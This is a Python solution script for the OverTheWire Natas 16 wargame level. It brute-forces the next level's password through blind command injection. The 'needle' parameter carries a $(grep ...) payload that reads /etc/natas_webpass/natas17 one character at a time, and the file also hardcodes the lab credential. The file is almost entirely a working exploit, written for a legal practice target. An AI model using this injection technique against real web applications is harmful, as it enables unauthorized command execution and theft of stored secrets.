import requests
import sys
import time

url = "http://natas16.natas.labs.overthewire.org/"
# Make absolutely sure this password is correct!
auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

# 1. Initialize a session to reuse the TCP connection (much faster and more stable)
session = requests.Session()
session.auth = auth

print("[*] Testing connection to Natas 16...")
# Use the session instead of requests.get
test_res = session.get(url, timeout=10)

# Sanity Check: Prevent the 32 'a's problem
if test_res.status_code != 200:
    print(f"[!] Error: Server returned status code {test_res.status_code}")
    print("[!] Check your auth credentials. The script is hitting an error page.")
    sys.exit()

print("[*] Connection successful! Starting Blind Command Injection...")

for i in range(32):
    for char in charset:
        # Build the payload using Command Substitution $(...)
        payload = f"doomed$(grep ^{password + char} /etc/natas_webpass/natas17)"
        
        # 2. Add the retry loop to catch dropped connections
        max_retries = 5
        for attempt in range(max_retries):
            try:
                # Send the GET request using the session and a timeout
                response = session.get(url, params={"needle": payload}, timeout=15)
                break  # If successful, break out of the retry loop
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                print(f"\n[!] Connection dropped or timed out. Retrying in 2 seconds... (Attempt {attempt + 1}/{max_retries})")
                time.sleep(2)
        else:
            # This triggers if the loop finishes without breaking (all retries failed)
            print("\n[-] Max retries reached. The server is completely unresponsive. Exiting.")
            sys.exit(1)
        
        # The Reflection Fix: We slice the HTML to ONLY look at the dictionary output 
        # which is located between the <pre> and </pre> tags.
        try:
            output_area = response.text.split("<pre>")[1].split("</pre>")[0]
        except IndexError:
            # If the <pre> tags are missing, something went completely wrong
            print("\n[!] Error: <pre> tags not found. The server response changed.")
            sys.exit()
        
        # The Logic Inversion: If "doomed" is missing from the output area, we got a hit!
        if "doomed" not in output_area:
            password += char
            sys.stdout.write(f"\r[*] Password found so far: {password}")
            sys.stdout.flush()
            break # Move to the next character for the password
            
        # 3. Add a tiny delay to be polite and avoid the server dropping the connection
        time.sleep(0.1)

print(f"\n[+] BOOM! The password for natas17 is: {password}")